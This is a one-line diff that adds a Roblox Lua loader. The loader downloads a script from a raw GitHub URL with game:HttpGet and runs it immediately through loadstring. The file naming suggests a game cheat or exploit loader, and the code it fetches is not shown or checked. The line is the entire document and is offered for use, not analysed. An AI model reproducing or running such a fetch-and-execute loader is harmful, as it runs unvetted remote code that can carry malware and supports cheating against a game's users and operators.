@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/my-anime-mine-spam2-sbd9l864g03ymb.lua"))()
